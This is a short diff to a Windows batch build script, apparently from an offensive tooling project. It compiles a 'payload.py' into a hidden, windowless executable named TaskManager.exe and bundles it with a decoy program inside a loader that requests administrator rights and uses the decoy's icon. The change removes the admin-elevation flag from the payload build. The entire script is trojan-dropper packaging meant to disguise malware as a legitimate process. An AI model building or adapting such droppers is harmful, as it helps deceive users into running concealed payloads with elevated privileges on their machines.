@@ -4,7 +4,7 @@ REM with the loader, which will also include your decoy program.  Final is store
 REM Author: oxagast
 REM Modified: 02/02/24
 
-pyinstaller.exe --windowed --noconsole --onefile --icon=taskserv-icon.ico --disable-windowed-traceback --uac-admin .\payload.py
+pyinstaller.exe --windowed --noconsole --onefile --icon=taskserv-icon.ico --disable-windowed-traceback .\payload.py
 copy dist\payload.exe .\TaskManager.exe
 pyinstaller.exe --add-binary="TaskManager.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
 
